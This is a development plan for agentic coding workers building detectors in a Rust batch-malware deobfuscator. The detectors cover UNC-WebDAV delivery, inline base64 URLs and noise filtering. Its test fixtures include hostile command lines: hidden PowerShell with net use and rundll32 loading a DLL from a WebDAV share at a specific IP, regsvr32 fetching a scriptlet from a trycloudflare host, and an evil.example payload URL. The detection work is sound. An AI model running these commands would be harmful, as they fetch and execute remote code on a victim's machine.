# batdeob Plan L — UNC-WebDAV C2 + inline-b64 URL decode

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development.

**Goal:** The Plan K investigation found that 342 corpus samples (24% of the 1,416) use UNC-WebDAV (`\\IP@port\davwwwroot\`) for malware delivery — a Qakbot/DarkGate-style pattern we don't track. Plus ~14 samples hide URLs in inline `FromBase64String('...')` blocks that we don't auto-decode, and ~2 use a `{"Script":"<b64>"}` JSON wrapper inside `-EncodedCommand`. Adding these three patterns brings the corpus IOC coverage from ~28% to ~53%.

**Prereq:** Plans A–K landed. 237 tests, v10 corpus has 710 Download + 1,075 DownloadInDeobText (787 clean, ~288 binary-metadata noise).

---

## Task 1: UNC-WebDAV C2 detection

**Impact:** +342 samples gain an IOC trait. Two-IP campaign (`45.9.74.36` × 596 occurrences, `45.9.74.32` × 88) plus a Cloudflare-Tunnel hostname variant.

**Files:**
- Modify: `rust/crates/batdeob-core/src/traits.rs` (new variant)
- Modify: `rust/crates/batdeob-core/src/deob_scan.rs` (new sweep)
- Modify: `rust/crates/batdeob-cli/src/main.rs` (summarize updates)

- [ ] **Step 1: Add the trait variant**

In `traits.rs`:

```rust
    UncWebDavC2 {
        host: String,         // IP or hostname (e.g., "45.9.74.36" or "x.trycloudflare.com")
        port: String,         // "@8888" → "8888"; "@SSL" → "SSL"
        share_path: String,   // The full UNC path observed
        command: String,      // The full line containing it (truncated to 240 chars)
    },
```

- [ ] **Step 2: Add tests** to `lib.rs`:

```rust
#[cfg(test)]
mod unc_webdav_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;

    #[test]
    fn unc_webdav_ip_port_extracted() {
        let script = br#"start powershell.exe -windowstyle hidden net use \\45.9.74.36@8888\davwwwroot\ rundll32 \\45.9.74.36@8888\davwwwroot\2731.dll entry"#;
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::UncWebDavC2 { host, port, .. }
            if host == "45.9.74.36" && port == "8888"
        ));
        assert!(has, "no UncWebDavC2: {:?}", report.traits);
    }

    #[test]
    fn unc_webdav_hostname_ssl() {
        let script = br#"regsvr32 /s \\travel-sagem-distant-potential.trycloudflare.com@SSL\DavWWWRoot\loader.sct"#;
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::UncWebDavC2 { host, port, .. }
            if host.contains("trycloudflare") && port == "SSL"
        ));
        assert!(has, "no UncWebDavC2 hostname: {:?}", report.traits);
    }

    #[test]
    fn unc_webdav_deduped_per_command() {
        // Same UNC referenced twice in one line — emit only one trait per (host, port, share)
        let script = br#"net use \\45.9.74.36@8888\davwwwroot\ & rundll32 \\45.9.74.36@8888\davwwwroot\x.dll"#;
        let report = analyze(script, &Config::default());
        let count = report.traits.iter().filter(|t| matches!(t,
            Trait::UncWebDavC2 { host, .. } if host == "45.9.74.36"
        )).count();
        assert_eq!(count, 1, "expected 1 deduped trait, got {}", count);
    }
}
```

- [ ] **Step 3: Add the sweep in `deob_scan.rs`**

Add a second regex + scan function (call BOTH from `analyze()`):

```rust
#[allow(clippy::expect_used)]
static UNC_WEBDAV_RE: Lazy<Regex> = Lazy::new(|| {
    // Matches:  \\<host>@<port>\<share>...
    // Where host is IP or hostname, port is digits or "SSL", share is anything not whitespace
    Regex::new(r"(?i)\\\\([A-Za-z0-9.\-]+)@([A-Za-z0-9]+)\\([A-Za-z0-9._\-/\\]+)")
        .expect("unc webdav regex")
});

pub fn scan_unc_webdav(deobfuscated: &str, env: &mut Environment) {
    let mut seen: std::collections::HashSet<(String, String, String)> = std::collections::HashSet::new();
    for caps in UNC_WEBDAV_RE.captures_iter(deobfuscated) {
        let host = caps.get(1).map(|m| m.as_str().to_string()).unwrap_or_default();
        let port = caps.get(2).map(|m| m.as_str().to_string()).unwrap_or_default();
        let share = caps.get(3).map(|m| m.as_str().to_string()).unwrap_or_default();
        if !seen.insert((host.clone(), port.clone(), share.clone())) { continue; }

        // Find the containing line for the command field
        let full_match = caps.get(0).map(|m| m.as_str()).unwrap_or("");
        let command = deobfuscated.lines()
            .find(|l| l.contains(full_match))
            .map(|l| l.chars().take(240).collect::<String>())
            .unwrap_or_default();

        env.traits.push(Trait::UncWebDavC2 {
            host,
            port,
            share_path: full_match.to_string(),
            command,
        });
    }
}
```

- [ ] **Step 4: Wire from `analyze()`**

After `deob_scan::scan_deob_text(&out, &mut env);`:

```rust
    deob_scan::scan_unc_webdav(&out, &mut env);
```

- [ ] **Step 5: Add to `summarize`**

In `rust/crates/batdeob-cli/src/main.rs`'s `build_summary`, add a new arm:

```rust
            Trait::UncWebDavC2 { host, port, share_path, .. } => {
                downloads.push(serde_json::json!({
                    "src": format!("\\\\{}@{}\\{}", host, port, share_path),
                    "dst": null,
                    "source": "unc-webdav-c2",
                    "host": host,
                    "port": port,
                }));
            }
```

- [ ] **Step 6: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo clippy --workspace --all-targets -- -D warnings 2>&1 | tail -5
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/
git commit -m "Detect UNC-WebDAV C2 (\\IP@port\davwwwroot\\) — Qakbot/DarkGate pattern"
```

---

## Task 2: Auto-decode short inline b64 URLs

**Impact:** +12-14 samples. URLs hidden in `FromBase64String('aHR0cHM6...')` blocks where the decoded string IS the URL.

**Files:**
- Modify: `rust/crates/batdeob-core/src/deob_scan.rs`

- [ ] **Step 1: Add test** to `lib.rs`:

```rust
#[cfg(test)]
mod inline_b64_url_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;
    use base64::Engine;

    #[test]
    fn inline_b64_url_in_deob_text_decoded() {
        // The deob text contains a FromBase64String('<url-as-b64>') literal.
        // The decoder should pick this up and emit a DownloadInDeobText.
        let url = "https://gofile.io/dl/abc123";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let script = format!("set X=$z=[Convert]::FromBase64String('{}')\r\necho %X%\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::DownloadInDeobText { src, .. } if src.contains("gofile.io/dl/abc123")
        ));
        assert!(has, "no inline-b64 URL extracted: {:?}", report.traits);
    }
}
```

- [ ] **Step 2: Add the decoder** to `deob_scan.rs`

Add a second helper that scans for `FromBase64String('<b64>')` literals, decodes each that's < 500 chars, and emits `DownloadInDeobText` if the decode is a valid `http(s)?://`/`ftp://` URL:

```rust
#[allow(clippy::expect_used)]
static B64_INLINE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"FromBase64String\s*\(\s*['\"]([A-Za-z0-9+/=]{20,500})['\"]\s*\)").expect("b64 inline")
});

pub fn scan_inline_b64_urls(deobfuscated: &str, env: &mut Environment) {
    use base64::Engine;
    let known: std::collections::HashSet<String> = env.traits.iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            Trait::DownloadInDeobText { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in B64_INLINE_RE.captures_iter(deobfuscated) {
        let b64 = match caps.get(1) { Some(m) => m.as_str(), None => continue };
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else { continue };
        let Ok(text) = String::from_utf8(decoded) else { continue };
        let text = text.trim();
        if !(text.starts_with("http://") || text.starts_with("https://") || text.starts_with("ftp://")) {
            continue;
        }
        // Validate it looks like a URL (basic char check)
        if text.len() > 2048 { continue; }  // sanity bound
        if !text.chars().all(|c| !c.is_control()) { continue; }
        let url = text.to_string();
        if known.contains(&url) { continue; }
        if !seen.insert(url.clone()) { continue; }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "FromBase64String inline".to_string(),
        });
    }
}
```

Wire from `analyze()` after `scan_deob_text` (before `scan_unc_webdav`):

```rust
    deob_scan::scan_deob_text(&out, &mut env);
    deob_scan::scan_inline_b64_urls(&out, &mut env);
    deob_scan::scan_unc_webdav(&out, &mut env);
```

- [ ] **Step 3: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "deob_scan: decode short FromBase64String(...) literals when they're URLs"
```

---

## Task 3: Filter deob_scan noise (digicert.com/CPS, XMP metadata)

**Impact:** Drops ~288 binary-metadata false positives from Plan K's sweep without losing any signal. Improves the signal:noise ratio of `DownloadInDeobText`.

**Files:**
- Modify: `rust/crates/batdeob-core/src/deob_scan.rs`

- [ ] **Step 1: Add a noise filter** in `scan_deob_text`:

```rust
fn is_noise_url(url: &str) -> bool {
    // X.509 certificate CPS / OCSP URLs that appear in DER-encoded data leaked
    // from binary droppers being partially emitted as text.
    if url.contains("digicert.com/CPS") || url.contains("digicert.com/CRL") { return true; }
    if url.contains("ocsp.digicert.com") || url.contains("crl.digicert.com") { return true; }
    if url.contains("ocsp.usertrust.com") || url.contains("crl.usertrust.com") { return true; }
    if url.contains("crl.microsoft.com") || url.contains("ocsp.microsoft.com") { return true; }
    if url.contains("crt.sectigo.com") || url.contains("ocsp.sectigo.com") { return true; }
    if url.contains("ocsp.thawte.com") || url.contains("ocsp.verisign.com") { return true; }
    if url.contains("ocsp.comodoca.com") { return true; }

    // XMP / image metadata URIs
    if url.contains("ns.adobe.com/") { return true; }
    if url.contains("purl.org/dc/") { return true; }
    if url.contains("w3.org/1999/02/22-rdf-syntax-ns") { return true; }
    if url.contains("w3.org/XML/1998/namespace") { return true; }

    // Stock photo / template attribution that appears in dropper assets
    if url.contains("istockphoto.com/legal/license-agreement") { return true; }

    // Common ad networks / analytics that get embedded in legitimate page assets
    if url.contains("doubleclick.net") { return true; }
    if url.contains("googletagmanager.com") || url.contains("google-analytics.com") { return true; }

    false
}
```

Use it inside the existing `scan_deob_text` loop — skip URLs where `is_noise_url(&url)` is true.

- [ ] **Step 2: Add a test** to `lib.rs`:

```rust
#[cfg(test)]
mod deob_scan_noise_filter_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;

    #[test]
    fn digicert_cps_filtered_out() {
        let script = b"echo This is a certificate URL: http://www.digicert.com/CPS\r\n";
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| matches!(t,
            Trait::DownloadInDeobText { src, .. } if src.contains("digicert.com/CPS")
        ));
        assert!(!has_noise, "digicert CPS not filtered: {:?}", report.traits);
    }

    #[test]
    fn adobe_xmp_filtered_out() {
        let script = b"echo metadata URL http://ns.adobe.com/photoshop/1.0/\r\n";
        let report = analyze(script, &Config::default());
        let has_noise = report.traits.iter().any(|t| matches!(t,
            Trait::DownloadInDeobText { src, .. } if src.contains("ns.adobe.com")
        ));
        assert!(!has_noise, "adobe XMP not filtered: {:?}", report.traits);
    }

    #[test]
    fn real_url_still_surfaced() {
        // Sanity: real URLs alongside noise still come through
        let script = b"echo http://evil.example/payload.exe\r\necho http://www.digicert.com/CPS\r\n";
        let report = analyze(script, &Config::default());
        let has_real = report.traits.iter().any(|t| matches!(t,
            Trait::DownloadInDeobText { src, .. } if src.contains("evil.example/payload.exe")
        ));
        assert!(has_real, "real URL filtered: {:?}", report.traits);
    }
}
```

- [ ] **Step 3: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/deob_scan.rs rust/crates/batdeob-core/src/lib.rs
git commit -m "deob_scan: filter known noise URLs (cert CPS, XMP metadata, ad networks)"
```

---

## Task 4: Corpus v11 + final measurement

- [ ] **Step 1: Build + run**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo build --release 2>&1 | tail -3
sed 's|corpus_results_v10|corpus_results_v11|g' /tmp/corpus_run_v10.sh > /tmp/corpus_run_v11.sh
chmod +x /tmp/corpus_run_v11.sh
mkdir -p /tmp/corpus_results_v11 && rm -rf /tmp/corpus_results_v11/* 2>/dev/null
timeout 1800 /tmp/corpus_run_v11.sh > /tmp/corpus_run_v11.log 2>&1
ls /tmp/corpus_results_v11/*.json | wc -l
```

- [ ] **Step 2: v10 → v11 compare**

```bash
python3 <<'PY'
import json
from pathlib import Path
from collections import Counter

def stats(d):
    samples = {}
    for f in Path(d).glob("*.json"):
        if f.stat().st_size == 0: continue
        try: samples[f.stem] = json.load(open(f))
        except: pass
    return samples

v10 = stats("/tmp/corpus_results_v10")
v11 = stats("/tmp/corpus_results_v11")
common = set(v10) & set(v11)
print(f"v10={len(v10)}  v11={len(v11)}  common={len(common)}")

def counts(samples, keys):
    cnt = Counter()
    for k in keys:
        for t in samples[k].get("traits", []):
            cnt[t.get("kind","")] += 1
    return cnt

c10 = counts(v10, common)
c11 = counts(v11, common)
print(f"\nOn {len(common)} common samples:")
print(f"  {'Trait':32} {'v10':>8} {'v11':>8}  Δ")
for k in sorted(set(c10)|set(c11), key=lambda x: -max(c10[x], c11[x]))[:18]:
    delta = c11[k] - c10[k]
    sign = "+" if delta > 0 else ""
    print(f"    {k:30} {c10[k]:>8} {c11[k]:>8}  {sign}{delta}")

# Samples newly gaining any URL IOC
URL_KINDS = {"Download", "DownloadInDeobText", "CertutilDownload", "BitsadminDownload", "UncWebDavC2"}
gained = lost = 0
for k in common:
    had_v10 = any(t.get("kind") in URL_KINDS for t in v10[k].get("traits",[]))
    had_v11 = any(t.get("kind") in URL_KINDS for t in v11[k].get("traits",[]))
    if had_v11 and not had_v10: gained += 1
    if had_v10 and not had_v11: lost += 1
print(f"\nSamples newly gaining URL IOC: +{gained}  lost: -{lost}")
print(f"v10 with-IOC: {sum(1 for k in common if any(t.get('kind') in URL_KINDS for t in v10[k].get('traits',[])))}")
print(f"v11 with-IOC: {sum(1 for k in common if any(t.get('kind') in URL_KINDS for t in v11[k].get('traits',[])))}")
PY
```

- [ ] **Step 3: Commit completion marker**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git commit --allow-empty -m "$(cat <<EOF
Plan L complete: UNC-WebDAV C2 + inline-b64 URL + noise filter

[paste v10 → v11 trait delta + samples-gaining-IOC count]
EOF
)"
```

## Report

- Trait deltas (focus on new `UncWebDavC2` count, target ~342)
- Samples newly gaining URL IOC (target ~250-350)
- v11 with-IOC coverage rate (target: ~50%+ of 1416)
- Noise-filter impact (DownloadInDeobText should decrease by ~250-300 due to filter)
- Test count (target: 237 + ~7 new = ~244)
- Commit SHAs (4 commits, one per task)

---

## Self-review

- **Spec coverage**: 3 high-impact targets from investigation + 1 measurement task.
- **Placeholders**: none.
- **Type consistency**: `Trait::UncWebDavC2` is new in Task 1, used in Tasks 1 + 4.
- **Risk**: UNC-WebDAV regex pattern `\\\\([A-Za-z0-9.\-]+)@([A-Za-z0-9]+)\\` is specific enough to avoid false positives on normal UNC paths like `\\server\share` (which lack `@port`). Verified by inspecting the corpus pattern.

**Plan L complete.** Execute via `superpowers:subagent-driven-development`.
